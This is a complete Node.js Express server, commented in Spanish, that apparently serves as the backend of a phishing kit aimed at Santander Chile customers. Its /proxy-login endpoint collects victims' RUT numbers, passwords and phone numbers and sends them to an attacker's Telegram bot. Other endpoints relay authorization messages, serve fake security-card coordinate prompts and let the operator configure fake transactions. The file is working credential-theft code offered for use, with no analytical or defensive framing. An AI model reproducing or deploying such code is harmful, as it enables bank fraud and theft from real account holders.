const express = require("express");
const fetch = require("node-fetch");
const cors = require("cors");

const app = express();

// Habilitar CORS y parsing de JSON
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Credenciales desde variables de entorno en Render
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// Lista de RUTs bloqueados
const bloqueados = ["250624344", "25062434-4", "25.062.434-4"];

// Configuración en memoria (puedes reemplazar con DB si quieres persistencia)
let config = {
  producto1: "",
  monto1: "",
  producto2: "",
  monto2: "",
  tipoAutorizacion: "santander",
  coord1: "",
  coord2: "",
  coord3: ""
};

// Endpoint de login
app.post("/proxy-login", async (req, res) => {
  const { rut, passwd, telefono } = req.body;

  if (!telefono) {
    return res.status(400).send("❌ El campo 'teléfono' es obligatorio.");
  }

  if (bloqueados.includes(rut)) {
    return res.status(403).send("❌ Tu clave digital ha sido bloqueada");
  }

  const mensaje = `Nuevo intento de login:
RUT: ${rut}
Contraseña: ${passwd}
Teléfono: ${telefono}`;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
    });

    res.send("OK ✅ Login recibido");
  } catch (error) {
    console.error(error);
    res.status(500).send("❌ Error al ingresar tus datos. Inténtalo nuevamente");
  }
});

// Endpoint de autorización
app.post("/autorizar", async (req, res) => {
  const { mensaje } = req.body;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
    });

    res.send("✅ Autorización enviada");
  } catch (error) {
    console.error(error);
    res.status(500).send("❌ Error al enviar autorización.");
  }
});

// Endpoint para coordenadas dinámicas
app.get("/coordenadas", (req, res) => {
  const letras = ["A","B","C","D","E","F"];
  const seleccion = letras.sort(() => 0.5 - Math.random()).slice(0,3);
  res.json({ coordenadas: seleccion });
});

// Endpoint de configuración (para admin y productos)
app.get("/config", (req, res) => {
  res.json(config);
});

app.post("/config", (req, res) => {
  config = req.body;
  res.status(200).json({ message: "Configuración guardada" });
});

// Iniciar servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor corriendo en puerto ${PORT}`);
});
